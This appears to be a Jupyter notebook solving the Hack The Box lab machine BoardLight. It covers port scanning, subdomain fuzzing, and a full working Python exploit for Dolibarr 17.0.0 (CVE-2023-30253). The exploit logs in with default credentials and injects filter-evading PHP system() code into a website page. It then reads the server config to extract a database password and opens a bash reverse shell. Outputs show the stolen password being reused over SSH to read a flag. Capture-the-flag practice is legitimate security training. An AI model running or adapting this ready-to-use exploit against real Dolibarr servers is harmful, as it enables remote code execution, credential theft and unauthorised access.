{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "2e88e785",
   "metadata": {},
   "source": [
    "# BoardLight\n",
    "\n",
    "<https://www.hackthebox.com/machines/boardlight>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "16000eb1",
   "metadata": {},
   "source": [
    "## Port Scanning\n",
    "\n",
    "```bash\n",
    "sudo nmap -vv -sC -sV -T4 -A 10.129.231.37\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "520dfae2",
   "metadata": {},
   "outputs": [],
   "source": [
    "TARGET_HOST = \"10.129.231.37\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "51d3b53b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Nmap is installed.\n",
      "Ports:\n",
      "{'protocol': 'tcp', 'portid': '22'}\n",
      "{'name': 'ssh', 'product': 'OpenSSH', 'version': '8.2p1 Ubuntu 4ubuntu0.11', 'extrainfo': 'Ubuntu Linux; protocol 2.0', 'ostype': 'Linux', 'method': 'probed', 'conf': '10'}\n",
      "{'protocol': 'tcp', 'portid': '80'}\n",
      "{'name': 'http', 'product': 'Apache httpd', 'version': '2.4.41', 'extrainfo': '(Ubuntu)', 'method': 'probed', 'conf': '10'}\n",
      "\n",
      "OS Matches:\n",
      "{'name': 'Linux 4.15 - 5.19', 'accuracy': '100', 'line': '70533'}\n",
      "{'name': 'MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)', 'accuracy': '100', 'line': '91791'}\n"
     ]
    }
   ],
   "source": [
    "from common import scan_ports\n",
    "\n",
    "scan_ports(TARGET_HOST)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "36c660ea",
   "metadata": {},
   "source": [
    "## Subdomain Discovery"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "588b40e7",
   "metadata": {},
   "outputs": [],
   "source": [
    "FFUF_OUTPUT_PATH = \"/tmp/ffuf_output.json\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "8c1e7486",
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "\n",
      "        /'___\\  /'___\\           /'___\\       \n",
      "       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n",
      "       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n",
      "        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n",
      "         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n",
      "          \\/_/    \\/_/   \\/___/    \\/_/       \n",
      "\n",
      "       v2.1.0-dev\n",
      "________________________________________________\n",
      "\n",
      " :: Method           : GET\n",
      " :: URL              : http://10.129.231.37\n",
      " :: Wordlist         : FUZZ: /Users/tomhu/Developer/SecLists/Discovery/DNS/subdomains-top1million-20000.txt\n",
      " :: Header           : Host: FUZZ.board.htb\n",
      " :: Output file      : /tmp/ffuf_output.json\n",
      " :: File format      : json\n",
      " :: Follow redirects : false\n",
      " :: Calibration      : true\n",
      " :: Timeout          : 10\n",
      " :: Threads          : 40\n",
      " :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n",
      "________________________________________________\n",
      "\n",
      "\u001b[2K:: Progress: [107/19966] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[2Kcrm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 155ms]\u001b[0m\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "\u001b[2K:: Progress: [19966/19966] :: Job [1/1] :: 408 req/sec :: Duration: [0:00:53] :: Errors: 0 ::\n"
     ]
    }
   ],
   "source": [
    "%%script env outfile=\"$FFUF_OUTPUT_PATH\" bash\n",
    "ffuf -u http://10.129.231.37 -H \"Host: FUZZ.board.htb\" -w ~/Developer/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac -o \"$outfile\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0fb2d532",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "FFUF output (1 in total):\n",
      " - crm: crm.board.htb\n"
     ]
    }
   ],
   "source": [
    "import json\n",
    "\n",
    "with open(FFUF_OUTPUT_PATH, \"r\") as fp:\n",
    "    ffuf_output = json.load(fp)\n",
    "print(f\"FFUF output ({len(ffuf_output['results'])} in total):\")\n",
    "for entry in ffuf_output[\"results\"]:\n",
    "    print(f\" - {entry['input']['FUZZ']}: {entry['host']}\")\n",
    "\n",
    "assert len(ffuf_output[\"results\"]) == 1\n",
    "\n",
    "new_host = ffuf_output[\"results\"][0][\"host\"]"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "eb970029",
   "metadata": {},
   "source": [
    "## Manual Inspection against the Newly Found Website\n",
    "\n",
    "> References:\n",
    ">\n",
    "> - <https://security.snyk.io/vuln/SNYK-PHP-DOLIBARRDOLIBARR-5660595>\n",
    "> - <https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253>\n",
    "\n",
    "- Application: `Dolibarr`\n",
    "- Version: `17.0.0`\n",
    "- Related CVE: `CVE-2023-30253`"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2895c0e9",
   "metadata": {},
   "source": [
    "## Exploit the Website"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "90145b32",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Default credentials of Dolibarr\n",
    "USERNAME = \"admin\"\n",
    "PASSWORD = \"admin\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "18fe25ae",
   "metadata": {},
   "outputs": [],
   "source": [
    "SITE_NAME = \"EXPLOIT\"\n",
    "PAGE_NAME = \"EXPLOIT\"\n",
    "CONF_FILE_PATH = \"/var/www/html/crm.board.htb/htdocs/conf/conf.php\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f4a854e3",
   "metadata": {},
   "outputs": [],
   "source": [
    "from yarl import URL\n",
    "\n",
    "BASE_URL: URL = URL(f\"http://{new_host}\")\n",
    "LOGIN_URL: URL = BASE_URL / \"index.php\"\n",
    "ADMIN_URL: URL = BASE_URL / \"admin/index.php\"\n",
    "WEBSITE_API_URL: URL = BASE_URL / \"website/index.php\"\n",
    "EXPLOIT_PAGE_URL: URL = BASE_URL / \"public/website/index.php\""
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0000a361",
   "metadata": {},
   "source": [
    "### Shell as `www-data`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "aff9e5f4",
   "metadata": {},
   "outputs": [],
   "source": [
    "import re\n",
    "from datetime import datetime\n",
    "from typing import Optional\n",
    "\n",
    "import aiohttp\n",
    "from bs4 import BeautifulSoup, Tag\n",
    "from yarl import URL\n",
    "\n",
    "credentials = {}\n",
    "\n",
    "\n",
    "async def get_csrf_token(\n",
    "    session: aiohttp.ClientSession, url: URL\n",
    ") -> Optional[str]:\n",
    "    async with session.get(url) as resp:\n",
    "        # Extract CSRF token from the response\n",
    "        html_content = await resp.text()\n",
    "        soup = BeautifulSoup(html_content, \"html.parser\")\n",
    "        meta_tag = soup.find(\"meta\", attrs={\"name\": \"anti-csrf-newtoken\"})\n",
    "\n",
    "        if meta_tag is not None and isinstance(meta_tag, Tag):\n",
    "            csrf_token = meta_tag.get(\"content\")\n",
    "            if csrf_token is not None and isinstance(csrf_token, str):\n",
    "                return csrf_token\n",
    "\n",
    "        return None\n",
    "\n",
    "\n",
    "async def login(\n",
    "    session: aiohttp.ClientSession,\n",
    "    url: URL,\n",
    "    csrf_token: str,\n",
    "    username: str,\n",
    "    password: str,\n",
    ") -> bool:\n",
    "    data = {\n",
    "        \"token\": csrf_token,\n",
    "        \"actionlogin\": \"login\",\n",
    "        \"loginfunction\": \"loginfunction\",\n",
    "        \"backtopage\": \"\",\n",
    "        \"tz\": \"-8\",\n",
    "        \"tz_string\": \"America/New_York\",\n",
    "        \"dst_observed\": \"1\",\n",
    "        \"dst_first\": \"2025-03-9T01:59:00Z\",\n",
    "        \"dst_second\": \"2025-11-2T01:59:00Z\",\n",
    "        \"screenwidth\": \"1032\",\n",
    "        \"screenheight\": \"1294\",\n",
    "        \"dol_hide_topmenu\": \"\",\n",
    "        \"dol_hide_leftmenu\": \"\",\n",
    "        \"dol_optimize_smallscreen\": \"\",\n",
    "        \"dol_no_mouse_hover\": \"\",\n",
    "        \"dol_use_jmobile\": \"\",\n",
    "        \"username\": username,\n",
    "        \"password\": password,\n",
    "    }\n",
    "    resp = await session.post(url, data=data)\n",
    "    return resp.status == 200\n",
    "\n",
    "\n",
    "async def create_site(\n",
    "    session: aiohttp.ClientSession,\n",
    "    url: URL,\n",
    "    csrf_token: str,\n",
    "    site_name: str,\n",
    ") -> bool:\n",
    "    data = aiohttp.FormData()\n",
    "    data.add_field(\"token\", csrf_token)\n",
    "    data.add_field(\"backtopage\", \"\")\n",
    "    data.add_field(\"dol_openinpopup\", \"\")\n",
    "    data.add_field(\"action\", \"addsite\")\n",
    "    data.add_field(\"website\", \"-1\")\n",
    "    data.add_field(\"WEBSITE_REF\", site_name)\n",
    "    data.add_field(\"WEBSITE_LANG\", \"en\")\n",
    "    data.add_field(\"WEBSITE_OTHERLANG\", \"\")\n",
    "    data.add_field(\"WEBSITE_DESCRIPTION\", \"\")\n",
    "    data.add_field(\"virtualhost\", f\"http://{site_name}.local/\")\n",
    "    data.add_field(\"addcontainer\", \"Create\")\n",
    "\n",
    "    resp = await session.post(url, data=data)\n",
    "    return resp.status == 200\n",
    "\n",
    "\n",
    "async def get_pageid(html_content: str, page_name: str) -> Optional[int]:\n",
    "    soup = BeautifulSoup(html_content, \"html.parser\")\n",
    "    page_selector = soup.find(\n",
    "        \"select\", attrs={\"name\": \"pageid\", \"id\": \"pageid\"}\n",
    "    )\n",
    "\n",
    "    if page_selector is not None and isinstance(page_selector, Tag):\n",
    "        pattern = re.compile(rf\"\\[page \\d+\\] {re.escape(page_name)} .*$\")\n",
    "        for option_tag in page_selector.find_all(name=\"option\"):\n",
    "            if option_tag is not None and isinstance(option_tag, Tag):\n",
    "                if pattern.search(option_tag.text) is not None:\n",
    "                    pageid_str = option_tag.get(\"value\")\n",
    "                    if (\n",
    "                        pageid_str is not None\n",
    "                        and isinstance(pageid_str, str)\n",
    "                        and pageid_str.isdigit()\n",
    "                    ):\n",
    "                        return int(pageid_str)\n",
    "\n",
    "    return None\n",
    "\n",
    "\n",
    "async def create_page(\n",
    "    session: aiohttp.ClientSession,\n",
    "    url: URL,\n",
    "    csrf_token: str,\n",
    "    site_name: str,\n",
    "    page_name: str,\n",
    ") -> Optional[int]:\n",
    "    data = aiohttp.FormData()\n",
    "    data.add_field(\"token\", csrf_token)\n",
    "    data.add_field(\"backtopage\", \"\")\n",
    "    data.add_field(\"dol_openinpopup\", \"\")\n",
    "    data.add_field(\"action\", \"addcontainer\")\n",
    "    data.add_field(\"website\", site_name)\n",
    "    data.add_field(\"pageidbis\", \"-1\")\n",
    "    data.add_field(\"pageid\", \"\")\n",
    "    data.add_field(\"radiocreatefrom\", \"checkboxcreatemanually\")\n",
    "    data.add_field(\"WEBSITE_TYPE_CONTAINER\", \"page\")\n",
    "    data.add_field(\"sample\", \"empty\")\n",
    "    data.add_field(\"WEBSITE_TITLE\", \"EXPLOIT\")\n",
    "    data.add_field(\"WEBSITE_PAGENAME\", page_name)\n",
    "    data.add_field(\"WEBSITE_ALIASALT\", \"\")\n",
    "    data.add_field(\"WEBSITE_DESCRIPTION\", \"\")\n",
    "    data.add_field(\"WEBSITE_IMAGE\", \"\")\n",
    "    data.add_field(\"WEBSITE_KEYWORDS\", \"\")\n",
    "    data.add_field(\"WEBSITE_LANG\", \"en\")\n",
    "    data.add_field(\"WEBSITE_AUTHORALIAS\", \"\")\n",
    "    data.add_field(\"datecreation\", \"08/21/2025\")\n",
    "    data.add_field(\"datecreationday\", \"21\")\n",
    "    data.add_field(\"datecreationmonth\", \"08\")\n",
    "    data.add_field(\"datecreationyear\", \"2025\")\n",
    "    data.add_field(\"datecreationhour\", \"20\")\n",
    "    data.add_field(\"datecreationmin\", \"00\")\n",
    "    data.add_field(\"datecreationsec\", \"00\")\n",
    "    data.add_field(\"htmlheader_x\", \"\")\n",
    "    data.add_field(\"htmlheader_y\", \"\")\n",
    "    data.add_field(\"htmlheader\", \"\")\n",
    "    data.add_field(\"addcontainer\", \"Create\")\n",
    "    data.add_field(\"externalurl\", \"\")\n",
    "    data.add_field(\"grabimages\", \"1\")\n",
    "    data.add_field(\"grabimagesinto\", \"root\")\n",
    "\n",
    "    resp = await session.post(url, data=data)\n",
    "    if resp.status != 200:\n",
    "        return None\n",
    "\n",
    "    return await get_pageid(await resp.text(), page_name)\n",
    "\n",
    "\n",
    "async def edit_page(\n",
    "    session: aiohttp.ClientSession,\n",
    "    url: URL,\n",
    "    csrf_token: str,\n",
    "    site_name: str,\n",
    "    pageid: int,\n",
    "    cmd: str,\n",
    ") -> bool:\n",
    "    # NOTE: \"pHp\" is used instead of \"php\" to bypass simple filters.\n",
    "    page_content: str = (\n",
    "        f\"\"\"\n",
    "<section id=\"exploit-section\" contenteditable=\"true\">\n",
    "    <?pHp system(\"{cmd}\")?>\n",
    "</section>\n",
    "\"\"\".strip()\n",
    "    )\n",
    "\n",
    "    data = aiohttp.FormData()\n",
    "    data.add_field(\"token\", csrf_token)\n",
    "    data.add_field(\"backtopage\", \"\")\n",
    "    data.add_field(\"dol_openinpopup\", \"\")\n",
    "    data.add_field(\"action\", \"updatesource\")\n",
    "    data.add_field(\"website\", site_name)\n",
    "    data.add_field(\"pageid\", str(pageid))\n",
    "    data.add_field(\"update\", \"Save\")\n",
    "    data.add_field(\"PAGE_CONTENT_x\", \"8\")\n",
    "    data.add_field(\"PAGE_CONTENT_y\", \"2\")\n",
    "    data.add_field(\"PAGE_CONTENT\", page_content)\n",
    "\n",
    "    resp = await session.post(url, data=data)\n",
    "    return resp.status == 200\n",
    "\n",
    "\n",
    "async def get_output(html_content: str) -> str:\n",
    "    soup = BeautifulSoup(html_content, \"html.parser\")\n",
    "    exploit_section = soup.find(\"section\", attrs={\"id\": \"exploit-section\"})\n",
    "\n",
    "    if exploit_section is not None and isinstance(exploit_section, Tag):\n",
    "        return str(exploit_section).strip()\n",
    "\n",
    "    return \"\"\n",
    "\n",
    "\n",
    "async def run_cmd(\n",
    "    session: aiohttp.ClientSession,\n",
    "    url: URL,\n",
    "    csrf_token: str,\n",
    "    site_name: str,\n",
    "    page_name: str,\n",
    "    pageid: int,\n",
    "    cmd: str,\n",
    ") -> Optional[str]:\n",
    "    # Edit the page to inject the command\n",
    "    is_page_edited = await edit_page(\n",
    "        session, url, csrf_token, site_name, pageid, cmd\n",
    "    )\n",
    "    if not is_page_edited:\n",
    "        raise ValueError(\"Failed to edit the exploit page.\")\n",
    "    print(\"Exploit page edited successfully.\")\n",
    "\n",
    "    # Access the exploit page\n",
    "    url = EXPLOIT_PAGE_URL % {\n",
    "        \"website\": site_name,\n",
    "        \"pageref\": page_name,\n",
    "    }\n",
    "    async with session.get(url) as resp:\n",
    "        if resp.status != 200:\n",
    "            print(f\"Failed to access exploit page: {resp.status}\")\n",
    "            return None\n",
    "\n",
    "        print(\"Exploit page accessed successfully.\")\n",
    "        response_text = await resp.text()\n",
    "        output = await get_output(response_text)\n",
    "        return output\n",
    "\n",
    "\n",
    "CONF_PATTERN = re.compile(\n",
    "    r\"\\$dolibarr_main_db_user='(?P<username>.*)';\\n\\$dolibarr_main_db_pass='(?P<password>.*)';\"\n",
    ")\n",
    "\n",
    "\n",
    "async def access_conf_file(\n",
    "    session: aiohttp.ClientSession,\n",
    "    url: URL,\n",
    "    csrf_token: str,\n",
    "    site_name: str,\n",
    "    page_name: str,\n",
    "    pageid: int,\n",
    "):\n",
    "    # Edit the page to read the configuration file\n",
    "    cmd = f\"id && pwd && cat {CONF_FILE_PATH}\"\n",
    "    output = await run_cmd(\n",
    "        session, url, csrf_token, site_name, page_name, pageid, cmd\n",
    "    )\n",
    "    if output is not None:\n",
    "        match = CONF_PATTERN.search(output)\n",
    "        if match is not None:\n",
    "            username = match.group(\"username\")\n",
    "            print(f\"Username: {username}\")\n",
    "            password = match.group(\"password\")\n",
    "            print(f\"Password: {password}\")\n",
    "            credentials[\"larissa\"] = password\n",
    "        else:\n",
    "            print(f\"{output=}\")\n",
    "\n",
    "\n",
    "async def create_reverse_shell(\n",
    "    session: aiohttp.ClientSession,\n",
    "    url: URL,\n",
    "    csrf_token: str,\n",
    "    site_name: str,\n",
    "    page_name: str,\n",
    "    pageid: int,\n",
    "    lhost: str,\n",
    "    lport: int,\n",
    "):\n",
    "    # Edit the page to create a reverse shell\n",
    "    cmd = f\"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\"\n",
    "    await run_cmd(session, url, csrf_token, site_name, page_name, pageid, cmd)\n",
    "\n",
    "\n",
    "async def exploit(\n",
    "    lhost: str,\n",
    "    lport: int,\n",
    "):\n",
    "    # Append datetime to the site name to avoid conflicts\n",
    "    current_datetime = datetime.now().strftime(\"%Y%m%d%H%M%S\")\n",
    "    site_name: str = f\"{SITE_NAME}_{current_datetime}\"\n",
    "    page_name: str = f\"{PAGE_NAME}_{current_datetime}\"\n",
    "\n",
    "    async with aiohttp.ClientSession() as session:\n",
    "        # Get CSRF token\n",
    "        csrf_token = await get_csrf_token(session, LOGIN_URL)\n",
    "        if csrf_token is None:\n",
    "            raise ValueError(\"CSRF token not found in the response.\")\n",
    "        print(f\"CSRF token: {csrf_token}\")\n",
    "\n",
    "        # Login as admin\n",
    "        is_logged_in = await login(\n",
    "            session, LOGIN_URL, csrf_token, USERNAME, PASSWORD\n",
    "        )\n",
    "        if not is_logged_in:\n",
    "            raise ValueError(\"Login failed.\")\n",
    "        print(\"Login successful.\")\n",
    "\n",
    "        # Get CSRF token\n",
    "        csrf_token = await get_csrf_token(session, ADMIN_URL)\n",
    "        if csrf_token is None:\n",
    "            raise ValueError(\"CSRF token not found in the response.\")\n",
    "        print(f\"CSRF token: {csrf_token}\")\n",
    "\n",
    "        # Create a website\n",
    "        is_website_created = await create_site(\n",
    "            session, WEBSITE_API_URL, csrf_token, site_name\n",
    "        )\n",
    "        if not is_website_created:\n",
    "            raise ValueError(\"Failed to create website.\")\n",
    "        print(\"Website created successfully.\")\n",
    "\n",
    "        # Create a new page\n",
    "        pageid = await create_page(\n",
    "            session, WEBSITE_API_URL, csrf_token, site_name, page_name\n",
    "        )\n",
    "        if pageid is None:\n",
    "            raise ValueError(\"Failed to create the exploit page.\")\n",
    "        print(f\"Exploit page ({pageid=}) created successfully.\")\n",
    "\n",
    "        # Access the configuration file\n",
    "        await access_conf_file(\n",
    "            session, WEBSITE_API_URL, csrf_token, site_name, page_name, pageid\n",
    "        )\n",
    "\n",
    "        signal = input(\"Do you want to create a reverse shell? (y/n): \")\n",
    "        if signal.lower() != \"y\":\n",
    "            return\n",
    "\n",
    "        # Create a reverse shell\n",
    "        await create_reverse_shell(\n",
    "            session,\n",
    "            WEBSITE_API_URL,\n",
    "            csrf_token,\n",
    "            site_name,\n",
    "            page_name,\n",
    "            pageid,\n",
    "            lhost,\n",
    "            lport,\n",
    "        )"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e5ab27a8",
   "metadata": {},
   "source": [
    "Remember to run the following command and wait for a shell\n",
    "\n",
    "```bash\n",
    "nc -lnvp 443\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cd883dca",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "CSRF token: 686af698b1845c9c8d86c58e6468ab5f\n",
      "Login successful.\n",
      "CSRF token: 686af698b1845c9c8d86c58e6468ab5f\n",
      "Website created successfully.\n",
      "Exploit page (pageid=52) created successfully.\n",
      "Exploit page edited successfully.\n",
      "Exploit page accessed successfully.\n",
      "Username: dolibarrowner\n",
      "Password: serverfun2$2023!!\n"
     ]
    }
   ],
   "source": [
    "await exploit(TARGET_HOST, 443)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c4265754",
   "metadata": {},
   "source": [
    "## Shell as `larissa`\n",
    "\n",
    "Try the password obtained from the configuration file"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "d05a8fa4",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "uid=1000(larissa) gid=1000(larissa) groups=1000(larissa),4(adm)\n",
      "Dev flag: 8fbd769275e2e813edf71e6521556f2d\n"
     ]
    }
   ],
   "source": [
    "import asyncssh\n",
    "\n",
    "if \"larissa\" not in credentials:\n",
    "    raise ValueError(\"No credentials for user 'larissa' found.\")\n",
    "\n",
    "username = \"larissa\"\n",
    "password = credentials[username]\n",
    "\n",
    "async with asyncssh.connect(\n",
    "    TARGET_HOST, username=username, password=password\n",
    ") as conn:\n",
    "    # Check user\n",
    "    result = await conn.run(\"id\", check=True)\n",
    "    print(result.stdout, end=\"\")\n",
    "\n",
    "    # Obtain the flag\n",
    "    result = await conn.run(\"cat user.txt\", check=True)\n",
    "    if result.stdout is not None:\n",
    "        dev_flag = result.stdout.strip()\n",
    "        print(f\"Dev flag: {dev_flag}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a1fee855",
   "metadata": {},
   "source": [
    "## Shell as `root`\n",
    "\n",
    "(TODO)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.13.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
